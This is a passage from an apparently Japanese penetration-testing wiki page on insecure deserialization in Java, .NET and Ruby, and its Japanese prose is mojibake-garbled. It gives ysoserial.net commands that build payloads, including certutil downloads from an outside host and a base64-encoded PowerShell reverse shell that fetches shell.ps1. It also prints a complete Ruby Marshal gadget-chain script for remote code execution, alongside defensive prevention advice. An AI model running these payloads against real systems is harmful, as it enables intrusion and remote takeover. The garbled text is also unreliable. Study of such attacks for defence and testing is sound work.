ãƒ„ãƒ¼ãƒ«[**JMET**](https://github.com/matthiaskaiser/jmet)ã¯ã€**æ—¢çŸ¥ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦æ‚ªæ„ã®ã‚ã‚‹ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€ã“ã‚Œã‚‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã«æ¥ç¶šã—ã¦æ”»æ’ƒã™ã‚‹ãŸã‚ã«ä½œæˆã•ã‚Œã¾ã—ãŸ**ã€‚ã“ã‚Œã‚‰ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯ã€ã‚µãƒ¼ãƒ“ã‚¹ãŒä¾ç„¶ã¨ã—ã¦è„†å¼±ã§ã‚ã‚Šã€ä½¿ç”¨ã•ã‚Œã‚‹ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ã„ãšã‚Œã‹ãŒè„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã«å­˜åœ¨ã™ã‚‹å ´åˆã«æ©Ÿèƒ½ã—ã¾ã™ã€‚

### å‚è€ƒæ–‡çŒ®

* JMETãƒˆãƒ¼ã‚¯: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* ã‚¹ãƒ©ã‚¤ãƒ‰: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Netã®æ–‡è„ˆã«ãŠã„ã¦ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®æ‚ªç”¨ã¯ã€Javaã§è¦‹ã‚‰ã‚Œã‚‹ã‚‚ã®ã¨åŒæ§˜ã®æ–¹æ³•ã§å‹•ä½œã—ã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºä¸­ã«ç‰¹å®šã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã¾ã™ã€‚

### ãƒ•ã‚£ãƒ³ã‚¬ãƒ¼ãƒ—ãƒªãƒ³ãƒ†ã‚£ãƒ³ã‚°

#### ãƒ›ãƒ¯ã‚¤ãƒˆãƒœãƒƒã‚¯ã‚¹

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’æ¤œæŸ»ã—ã¦ã€ä»¥ä¸‹ã®å‡ºç¾ã‚’æ¢ã™ã¹ãã§ã™ï¼š

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

ãƒ¦ãƒ¼ã‚¶ãƒ¼åˆ¶å¾¡ä¸‹ã®å¤‰æ•°ã«ã‚ˆã£ã¦å‹ã‚’æ±ºå®šã§ãã‚‹ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¶ãƒ¼ã«ç„¦ç‚¹ã‚’å½“ã¦ã‚‹ã¹ãã§ã™ã€‚

#### ãƒ–ãƒ©ãƒƒã‚¯ãƒœãƒƒã‚¯ã‚¹

æ¤œç´¢ã¯ã€Base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸæ–‡å­—åˆ—**AAEAAAD/////**ã¾ãŸã¯ã€ã‚µãƒ¼ãƒãƒ¼å´ã§ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹é¡ä¼¼ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’å¯¾è±¡ã¨ã—ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹å‹ã‚’åˆ¶å¾¡ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã“ã‚Œã«ã¯ã€`TypeObject`ã‚„`$type`ã‚’å«ã‚€ãŒã“ã‚Œã«é™å®šã•ã‚Œãªã„**JSON**ã¾ãŸã¯**XML**æ§‹é€ ãŒå«ã¾ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### ysoserial.net

ã“ã®å ´åˆã€ãƒ„ãƒ¼ãƒ«[**ysoserial.net**](https://github.com/pwntester/ysoserial.net)ã‚’ä½¿ç”¨ã—ã¦**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®æ‚ªç”¨ã‚’ä½œæˆ**ã§ãã¾ã™ã€‚gitãƒªãƒã‚¸ãƒˆãƒªã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã‚‰ã€Visual Studioãªã©ã‚’ä½¿ç”¨ã—ã¦**ãƒ„ãƒ¼ãƒ«ã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

**ysoserial.netãŒã©ã®ã‚ˆã†ã«æ‚ªç”¨ã‚’ä½œæˆã™ã‚‹ã‹**ã«ã¤ã„ã¦å­¦ã³ãŸã„å ´åˆã¯ã€[**ObjectDataProviderã‚¬ã‚¸ã‚§ãƒƒãƒˆ + ExpandedWrapper + Json.Netãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ã«ã¤ã„ã¦èª¬æ˜ã—ã¦ã„ã‚‹ã“ã®ãƒšãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¦ãã ã•ã„**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)ã€‚

**ysoserial.net**ã®ä¸»ãªã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€**`--gadget`**ã€**`--formatter`**ã€**`--output`**ã€ãŠã‚ˆã³**`--plugin`**ã§ã™ã€‚

* **`--gadget`**ã¯ã€æ‚ªç”¨ã™ã‚‹ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ç¤ºã™ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ï¼ˆãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºä¸­ã«ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹ã‚¯ãƒ©ã‚¹/é–¢æ•°ã‚’ç¤ºã—ã¾ã™ï¼‰ã€‚
* **`--formatter`**ã¯ã€æ‚ªç”¨ã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹æ–¹æ³•ã‚’ç¤ºã™ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ï¼ˆãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ãŸã‚ã«ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãŒä½¿ç”¨ã—ã¦ã„ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’çŸ¥ã‚Šã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚
* **`--output`**ã¯ã€æ‚ªç”¨ã‚’**ç”Ÿ**ã¾ãŸã¯**base64**ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã§å–å¾—ã—ãŸã„ã‹ã©ã†ã‹ã‚’ç¤ºã™ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚_æ³¨æ„ã—ã¦ãã ã•ã„ã€**ysoserial.net**ã¯ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’**UTF-16LE**ï¼ˆWindowsã§ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ä½¿ç”¨ã•ã‚Œã‚‹ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ï¼‰ã‚’ä½¿ç”¨ã—ã¦**ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰**ã™ã‚‹ãŸã‚ã€Linuxã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‹ã‚‰ç”Ÿã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã™ã‚‹ã¨ã€æ‚ªç”¨ãŒæ­£ã—ãæ©Ÿèƒ½ã—ãªã„**ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã®äº’æ›æ€§ã®å•é¡Œ**ãŒç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼ˆHTB JSONãƒœãƒƒã‚¯ã‚¹ã§ã¯ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯UTF-16LEã¨ASCIIã®ä¸¡æ–¹ã§æ©Ÿèƒ½ã—ã¾ã—ãŸãŒã€ã“ã‚Œã¯å¸¸ã«æ©Ÿèƒ½ã™ã‚‹ã¨ã¯é™ã‚Šã¾ã›ã‚“ï¼‰ã€‚_
* **`--plugin`**ysoserial.netã¯ã€ViewStateã®ã‚ˆã†ãª**ç‰¹å®šã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ç”¨ã®æ‚ªç”¨ã‚’ä½œæˆã™ã‚‹ãŸã‚ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³**ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚

#### è¿½åŠ ã®ysoserial.netãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿

* `--minify`ã¯ã€**å°ã•ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’æä¾›ã—ã¾ã™ï¼ˆå¯èƒ½ãªå ´åˆï¼‰ã€‚
* `--raf -f Json.Net -c "anything"`ã“ã‚Œã¯ã€æä¾›ã•ã‚ŒãŸãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ï¼ˆã“ã®å ´åˆã¯`Json.Net`ï¼‰ã§ä½¿ç”¨ã§ãã‚‹ã™ã¹ã¦ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ç¤ºã—ã¾ã™ã€‚
* `--sf xml`ã¯ã€**ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**ï¼ˆ`-g`ï¼‰ã‚’ç¤ºã™ã“ã¨ãŒã§ãã€ysoserial.netã¯ã€Œxmlã€ã‚’å«ã‚€ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ã‚’æ¤œç´¢ã—ã¾ã™ï¼ˆå¤§æ–‡å­—ã¨å°æ–‡å­—ã‚’åŒºåˆ¥ã—ãªã„ï¼‰ã€‚

**ysoserialã®ä¾‹**ã‚’ä½¿ç”¨ã—ã¦æ‚ªç”¨ã‚’ä½œæˆã—ã¾ã™ï¼š
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** ã«ã¯ã€å„ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã™ã‚‹ã‹ã‚’ã‚ˆã‚Šã‚ˆãç†è§£ã™ã‚‹ã®ã«å½¹ç«‹ã¤ **éå¸¸ã«èˆˆå‘³æ·±ã„ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿** ãŒã‚ã‚Šã¾ã™: `--test`\
ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’æŒ‡å®šã™ã‚‹ã¨ã€ **ysoserial.net** ã¯ **ãƒ­ãƒ¼ã‚«ãƒ«ã§** **ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’è©¦ã¿ã¾ã™** ã®ã§ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæ­£ã—ãæ©Ÿèƒ½ã™ã‚‹ã‹ã©ã†ã‹ã‚’ãƒ†ã‚¹ãƒˆã§ãã¾ã™ã€‚\
ã“ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ä¾¿åˆ©ã§ã™ã€‚ãªãœãªã‚‰ã€ã‚³ãƒ¼ãƒ‰ã‚’ãƒ¬ãƒ“ãƒ¥ãƒ¼ã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã®æ–­ç‰‡ãŒè¦‹ã¤ã‹ã‚‹ã‹ã‚‰ã§ã™ ( [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208) ã‹ã‚‰):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
ã“ã‚Œã¯ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ã€ã‚³ãƒ¼ãƒ‰ãŒ [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) ã‚’å‘¼ã³å‡ºã™ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In the **å‰ã®ã‚³ãƒ¼ãƒ‰ã¯ä½œæˆã•ã‚ŒãŸã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã«è„†å¼±ã§ã™**ã€‚ã—ãŸãŒã£ã¦ã€.Netã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§åŒæ§˜ã®ã‚‚ã®ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€ãã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚‚è„†å¼±ã§ã‚ã‚‹å¯èƒ½æ€§ãŒé«˜ã„ã§ã™ã€‚\
ã—ãŸãŒã£ã¦ã€**`--test`**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ã€**ã©ã®ã‚³ãƒ¼ãƒ‰ã®ãƒãƒ£ãƒ³ã‚¯ãŒ**ysoserial.net**ã«ã‚ˆã£ã¦ä½œæˆã•ã‚Œã‚‹ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã«è„†å¼±ã§ã‚ã‚‹ã‹ã‚’ç†è§£ã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚**

### ViewState

[**.Netã®\_\_ViewStateãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã®ã“ã®POSTã‚’è¦‹ã¦ãã ã•ã„**](exploiting-\_\_viewstate-parameter.md) **ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€‚** ã‚‚ã—ã‚ãªãŸãŒ**è¢«å®³è€…ã®ãƒã‚·ãƒ³ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ç§˜å¯†ã‚’ã™ã§ã«çŸ¥ã£ã¦ã„ã‚‹ãªã‚‰ã€[**ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã‚’çŸ¥ã‚‹ãŸã‚ã«ã“ã®æŠ•ç¨¿ã‚’èª­ã‚“ã§ãã ã•ã„**](exploiting-\_\_viewstate-knowing-the-secret.md)**ã€‚**

### Prevention

.Netã«ãŠã‘ã‚‹ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã«é–¢é€£ã™ã‚‹ãƒªã‚¹ã‚¯ã‚’è»½æ¸›ã™ã‚‹ãŸã‚ã«ï¼š

* **ãƒ‡ãƒ¼ã‚¿ã‚¹ãƒˆãƒªãƒ¼ãƒ ã«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¿ã‚¤ãƒ—ã‚’å®šç¾©ã•ã›ãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚** å¯èƒ½ãªé™ã‚Š`DataContractSerializer`ã¾ãŸã¯`XmlSerializer`ã‚’åˆ©ç”¨ã—ã¦ãã ã•ã„ã€‚
* **`JSON.Net`ã®å ´åˆã€`TypeNameHandling`ã‚’`None`ã«è¨­å®šã—ã¾ã™ï¼š** %%%TypeNameHandling = TypeNameHandling.None%%%
* **`JavaScriptSerializer`ã‚’`JavaScriptTypeResolver`ã¨ä¸€ç·’ã«ä½¿ç”¨ã—ãªã„ã§ãã ã•ã„ã€‚**
* **ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºå¯èƒ½ãªã‚¿ã‚¤ãƒ—ã‚’åˆ¶é™ã—ã€`System.IO.FileInfo`ã®ã‚ˆã†ãª.Netã‚¿ã‚¤ãƒ—ã«å†…åœ¨ã™ã‚‹ãƒªã‚¹ã‚¯ã‚’ç†è§£ã—ã¾ã™ã€‚ã“ã‚Œã¯ã‚µãƒ¼ãƒãƒ¼ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å¤‰æ›´ã—ã€ã‚µãƒ¼ãƒ“ã‚¹æ‹’å¦æ”»æ’ƒã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**
* **ãƒªã‚¹ã‚¯ã®ã‚ã‚‹ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æŒã¤ã‚¿ã‚¤ãƒ—ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚** ä¾‹ãˆã°ã€`System.ComponentModel.DataAnnotations.ValidationException`ã®`Value`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
* **ã‚¿ã‚¤ãƒ—ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹åŒ–ã‚’å®‰å…¨ã«åˆ¶å¾¡ã—ã€æ”»æ’ƒè€…ãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒ—ãƒ­ã‚»ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€`DataContractSerializer`ã‚„`XmlSerializer`ã§ã•ãˆè„†å¼±ã«ãªã‚Šã¾ã™ã€‚**
* **`BinaryFormatter`ãŠã‚ˆã³`JSON.Net`ã®ãŸã‚ã«ã‚«ã‚¹ã‚¿ãƒ `SerializationBinder`ã‚’ä½¿ç”¨ã—ã¦ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆåˆ¶å¾¡ã‚’å®Ÿè£…ã—ã¾ã™ã€‚**
* **.Netå†…ã®æ—¢çŸ¥ã®ä¸å®‰å…¨ãªãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚¬ã‚¸ã‚§ãƒƒãƒˆã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã¦ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¶ãŒãã®ã‚ˆã†ãªã‚¿ã‚¤ãƒ—ã‚’ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹åŒ–ã—ãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚**
* **ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã‚¢ã‚¯ã‚»ã‚¹ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‹ã‚‰æ½œåœ¨çš„ã«ãƒªã‚¹ã‚¯ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’éš”é›¢ã—ã€`System.Windows.Data.ObjectDataProvider`ã®ã‚ˆã†ãªæ—¢çŸ¥ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ä¿¡é ¼ã§ããªã„ãƒ‡ãƒ¼ã‚¿ã‚½ãƒ¼ã‚¹ã«ã•ã‚‰ã•ãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚**

### **References**

* Javaã¨.Netã®JSONãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã«é–¢ã™ã‚‹**è«–æ–‡ï¼š** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**ã€**ãƒˆãƒ¼ã‚¯ï¼š [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ãŠã‚ˆã³ã‚¹ãƒ©ã‚¤ãƒ‰ï¼š [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Rubyã§ã¯ã€ã‚·ãƒªã‚¢ãƒ«åŒ–ã¯**marshal**ãƒ©ã‚¤ãƒ–ãƒ©ãƒªå†…ã®2ã¤ã®ãƒ¡ã‚½ãƒƒãƒ‰ã«ã‚ˆã£ã¦ä¿ƒé€²ã•ã‚Œã¾ã™ã€‚æœ€åˆã®ãƒ¡ã‚½ãƒƒãƒ‰ã¯**dump**ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒã‚¤ãƒˆã‚¹ãƒˆãƒªãƒ¼ãƒ ã«å¤‰æ›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ã‚·ãƒªã‚¢ãƒ«åŒ–ã¨å‘¼ã°ã‚Œã¾ã™ã€‚é€†ã«ã€2ç•ªç›®ã®ãƒ¡ã‚½ãƒƒãƒ‰**load**ã¯ã€ãƒã‚¤ãƒˆã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«æˆ»ã™ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã€ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã¨å‘¼ã°ã‚Œã¾ã™ã€‚

ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«ã€**Rubyã¯HMACï¼ˆãƒãƒƒã‚·ãƒ¥ãƒ™ãƒ¼ã‚¹ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸èªè¨¼ã‚³ãƒ¼ãƒ‰ï¼‰ã‚’ä½¿ç”¨ã—ã€ãƒ‡ãƒ¼ã‚¿ã®æ•´åˆæ€§ã¨çœŸæ­£æ€§ã‚’ç¢ºä¿ã—ã¾ã™ã€‚** ã“ã®ç›®çš„ã®ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚­ãƒ¼ã¯ã€ã„ãã¤ã‹ã®å¯èƒ½ãªå ´æ‰€ã®ã„ãšã‚Œã‹ã«ä¿å­˜ã•ã‚Œã¾ã™ï¼š

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.Xã®ä¸€èˆ¬çš„ãªãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‹ã‚‰RCEã‚¬ã‚¸ã‚§ãƒƒãƒˆãƒã‚§ãƒ¼ãƒ³ï¼ˆè©³ç´°ã¯** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**ï¼‰**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
ä»–ã®RCEãƒã‚§ãƒ¼ãƒ³ã‚’åˆ©ç”¨ã—ã¦Ruby On Railsã‚’æ”»æ’ƒã™ã‚‹: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() ãƒ¡ã‚½ãƒƒãƒ‰

[**ã“ã®è„†å¼±æ€§ãƒ¬ãƒãƒ¼ãƒˆ**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/)ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æœªã‚µãƒ‹ã‚¿ã‚¤ã‚ºå…¥åŠ›ãŒrubyã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®`.send()`ãƒ¡ã‚½ãƒƒãƒ‰ã«åˆ°é”ã™ã‚‹ã¨ã€ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®**ä»»æ„ã®ä»–ã®ãƒ¡ã‚½ãƒƒãƒ‰**ã‚’ä»»æ„ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§å‘¼ã³å‡ºã™ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚

